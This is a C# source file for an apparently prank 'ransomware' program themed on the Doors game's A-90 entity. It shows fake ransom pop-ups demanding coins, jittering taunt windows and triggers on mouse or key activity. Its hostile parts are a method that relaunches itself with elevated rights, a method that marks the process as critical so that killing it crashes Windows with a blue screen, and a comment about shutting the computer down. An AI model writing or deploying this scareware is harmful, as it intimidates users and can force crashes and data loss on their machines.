using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace rans0m
{
    public class Global
    {
        // ----------------------------- CONFIGURATION -----------------------------
        public static readonly int minRansomTime = 26*3; // In seconds (duration of a ransom attack because else you can have two at the same time and i don't have time to fix it correctly rn)
        public static readonly int maxRansomTime = 10*60; // In seconds

        // Titles used by the pop up windows (rich Doors / A-90 malware variety)
        public static readonly List<string> tauntTitles = new() {
            "RANS0M",
            "MOSNAR",
            "RANSOM.exe",
            "A-90.exe",
            "M0NARS",
            "YOU ARE AN IDIOT",
            "Untitled (3)",
            "I FOUND YOU",
            "STOP MOVING",
            "DO NOT BLINK",
            "HE SEES YOU",
            "A-90 HAS BREACHED YOUR PC",
            "SECURITY ALERT: COMPROMISED",
            "FATAL_EXCEPTION_0x00000A90",
            "CRITICAL_PROCESS_LOCKED",
            "TIMES UP",
            "WHERE IS MY MONEY?",
            "PAY 500 COINS",
            "NO REFUNDS",
            "DOORS // THE ROOMS",
            "CORRUPT_SECTOR_90",
            "CAN YOU SURVIVE?",
            "SYSTEM32/OVERRIDE",
            "LOOK AT YOUR WALLPAPER",
            "GIVE MONEY",
            "ERROR",
            "DHAUFGH",
            "01000001 00101101 00111001 00110000",
            "NO ESCAPE",
            "HE IS WATCHING",
            "DO NOT RESIST",
            "SYSTEM OVERLOAD",
            "STATIC ENCRUSTED",
            "CANNOT TERMINATE",
            "YOUR DESKTOP BELONGS TO US",
            "NICE TRY",
            "ALMOST OUT OF TIME",
            "DON'T LOOK BEHIND YOU",
            "ACCESS VIOLATION: 0xDEADBEEF",
            "LOOK AT THE EDGES",
            "THE RED STATIC IS SPREADING",
            "TOO LATE",
            "GIVE UP",
            "_________"
        };

        // Text messages displayed on retro malware alert boxes
        public static readonly List<string> tauntMessages = new() {
            "CRITICAL WARNING:\nA-90 has locked your desktop.\nDeposit 500 Gold Coins or suffer fatal crash.",
            "DO NOT MOVE YOUR MOUSE.\nEvery click costs valuable seconds.\nTime is running out.",
            "FILE CORRUPTION IMMINENT.\nSystem integrity compromised by Room A-90.\nPay the ransom immediately.",
            "ALL ATTEMPTS TO CLOSE THIS WINDOW\nWILL ACCELERATE THE SYSTEM BSOD.\nGIVE 500 COINS.",
            "SECURITY NOTICE:\nUnauthorized mouse movement detected.\nRansomware execution escalating...",
            "LOOK AT YOUR SCREEN EDGES.\nThe red static is creeping inward.\nSoon you will see nothing at all.",
            "RANSOM DEMAND:\n500 Gold Coins.\nCoins are scattered across your screen.\nFind them before OST Layer 3 ends.",
            "ERROR 0x00000A90:\nHost process hijacked by entity.\nResistance is completely futile."
        };

        // Images used by the pop up windows
        public static readonly List<Bitmap> tauntImages = new() {
            Properties.Resources.glitch,
            Properties.Resources.idiot,
            Properties.Resources.ransom_idle,
            Properties.Resources.ransom_random,
            Properties.Resources.stop_sign,
            Properties.Resources.static1,
            Properties.Resources.taunt2,
            Properties.Resources.taunt3,
        };





        // -------------------------- GLOBAL VARIABLES --------------------------

        public static int ransomLeft = 0;
        public static bool underRansom = false;
        public static Action? RansomPayed;
        public static Action? StopMusic;
        public static List<string> usedCoins = new();
        public static bool canAttack = true;
        public static Point lastRegisteredMousePos;
        public static bool spyingMouse = false;
        public static List<Form> activeTauntWindows = new();
        public static Random rng = new Random();
        public static Rectangle screenBounds = Screen.PrimaryScreen.WorkingArea;


        




        // -------------------------- PUBLIC METHODS --------------------------

        public static void KeyPressed(Keys key)
        { 
            if (spyingMouse) {
                lastRegisteredMousePos = new Point(-1, -1); // Invalidate the last registered mouse position if a key is pressed during the spy phase so it also triggers the ransom
            }
        }

        /// <returns>true if the application is started as administrator</returns>
        public static bool IsAdministrator()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        /// <summary>
        /// Tries to restart the process as admin
        /// </summary>
        public static void AttemptForceAdmin()
        {
            if (!Global.IsAdministrator()) // If process not ran as admin
            {
                try
                {
                    var proc = new Process
                    {
                        StartInfo =
                    {
                        FileName = Process.GetCurrentProcess().MainModule.FileName,
                        UseShellExecute = true,
                        Verb = "runas"
                    }
                    };

                    proc.Start(); // Start new process as admin
                    Process.GetCurrentProcess().Kill(); // Kill current process
                }
                catch {
                    //MessageBox.Show("RANS0M requires admin privileges.", "RANS0M");
                    //Process.GetCurrentProcess().Kill(); // Kill process
                    // Not forcing admin anymore since I can just shutdown the computer without admin privileges
                }
            }
        }

        /// <summary>
        /// Transforms the process into a critical process, which will cause a BSOD if it is killed
        /// </summary>
        public static void IntoCriticalProcess()
        {
            [DllImport("ntdll.dll", SetLastError = true)]
            static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
            int isCritical = 1;
            int BreakOnTermination = 0x1D;  // flag BreakOnTermination
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }

        /// <summary>
        /// Randomly positions a control within the screen bounds.
        /// </summary>
        public static void RandomPosControl(Control control)
        {
            int maxX = Math.Max(1, Global.screenBounds.Width - control.Width);
            int maxY = Math.Max(1, Global.screenBounds.Height - control.Height);
            int x = Global.rng.Next(0, maxX);
            int y = Global.rng.Next(0, maxY);

            control.Location = new Point(x, y);
        }

        /// <summary>
        /// Centers a control within the screen bounds.
        /// </summary>
        public static void CenterControl(Control control)
        {
            control.Location = new Point((Global.screenBounds.Width / 2) - control.Width / 2, (Global.screenBounds.Height / 2) - control.Height / 2);
        }

        /// <summary>
        /// Cool glitch idle animation, used for the ransom pop ups with rapid authentic jitter
        /// </summary>
        public async static void GlitchIdle(Control control, bool divideAndTaunt=false)
        {
            int x = control.Location.X;
            int y = control.Location.Y;

            while (!control.IsDisposed)
            {
                await Task.Delay(35); // Fast ~28fps jitter
                if (control.IsDisposed) break;

                try
                {
                    if (!Global.underRansom)
                    {
                        control.Invoke(() => control.Dispose());
                        break;
                    }

                    control.Invoke((MethodInvoker)delegate
                    {
                        if (control.IsDisposed) return;

                        if (divideAndTaunt)
                        {
                            if (Global.rng.Next(1, 400) <= 2) // Occasional teleport & spawn
                            {
                                x = Global.rng.Next(0, Math.Max(10, Global.screenBounds.Width - control.Width));
                                y = Global.rng.Next(0, Math.Max(10, Global.screenBounds.Height - control.Height));

                                if (control is Ransomed r)
                                {
                                    r.baseLocation = new Point(x, y);
                                }

                                lock (Global.activeTauntWindows)
                                {
                                    Global.activeTauntWindows.RemoveAll(f => f == null || f.IsDisposed);
                                    if (Global.activeTauntWindows.Count < 2)
                                    {
                                        TauntWindow tauntWindow = new TauntWindow();
                                        tauntWindow.Show();
                                    }
                                }
                            }
                        }

                        Point anchor = new Point(x, y);
                        if (control is Ransomed ransomed)
                        {
                            anchor = ransomed.baseLocation;
                        }

                        // Subtle micro-tremble around anchor
                        control.Location = new Point(anchor.X + Global.rng.Next(-1, 2), anchor.Y + Global.rng.Next(-1, 2));
                    });
                }
                catch { break; }
            }
        }

    }
}
